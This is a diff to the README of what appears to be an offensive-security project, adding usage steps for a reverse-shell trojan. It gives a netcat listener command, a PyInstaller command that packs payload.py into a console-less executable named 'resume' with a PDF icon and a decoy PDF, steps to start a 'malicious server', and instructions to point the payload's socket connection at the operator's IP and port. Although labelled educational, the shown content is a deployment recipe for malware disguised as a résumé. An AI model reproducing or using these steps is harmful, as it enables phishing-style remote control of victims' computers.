@@ -21,12 +21,24 @@ Key points:
 - 🐍 Python 3.x.
 - 🌐 Network access to the target server (controlled lab environment).
 - ✅ Permissions to run scripts and open network connections.
+-    Node Js.
 
 ## 🚀 Usage
 
 1. Set up a listener on your machine (educational lab):
    ```bash
-   nc -lvp 4444
+   nc -lvp 12345
 2. Run this script on windows terminal to convert python code to malicous exe file:
    ```bash
    python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --name resume ./payload.py
+3. Run the mailicous server:
+   ```bash
+   cd mailicous_server && npm install && npm run dev
+
+> ⚠️ **Warning:** Do not forget to edit your code.
+
+## 🚀 Edit requirments
+
+1. SERVER_URL = "http://192.168.88.105:2020" in payload.py replace the local ip address with your local ip address.
+
+2. s.connect(("IP", "PORT")) Replace ip with your local ip address and port with netcat port.
